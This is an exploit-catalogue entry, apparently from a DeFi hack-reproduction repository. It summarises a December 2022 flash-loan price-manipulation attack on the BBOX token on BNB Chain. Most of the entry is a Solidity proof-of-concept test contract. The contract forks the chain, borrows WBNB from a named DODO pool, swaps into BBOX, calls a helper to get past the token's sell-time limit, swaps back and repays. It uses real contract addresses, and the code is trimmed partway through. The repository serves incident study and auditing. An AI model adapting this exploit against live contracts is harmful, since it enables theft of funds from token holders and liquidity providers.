# [?] - BBOX - FlashLoan price manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BBOX
Published: 2022-12-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/BBOX_exp.sol
Type: defi-exploit-poc

## Details
Lost: 12k
References:
- https://twitter.com/AnciliaInc/status/1599599614490877952
- https://bscscan.com/tx/0xac57c78881a7c00dfbac0563e21b5ae3a8e3f9d1b07198a27313722a166cc0a3

```solidity
contract ContractTest is Test {
    IERC20 BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint256 flashLoanAmount;
    address contractAddress;
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_106_506);
    }

    function testExploit() public {
        WBNB.approve(address(Router), type(uint256).max);
        BBOX.approve(address(Router), type(uint256).max);
        TransferBBOXHelp transferHelp = new TransferBBOXHelp(); // sell time limit
        contractAddress = address(transferHelp);
        flashLoanAmount = WBNB.balanceOf(dodo);
        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        WBNBToBBOX();
        contractAddress.call(abi.encodeWithSignature("transferBBOX()"));
        BBOXToWBNB();
        WBNB.transfer(dodo, flashLoanAmount);
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/BBOX_exp.sol_
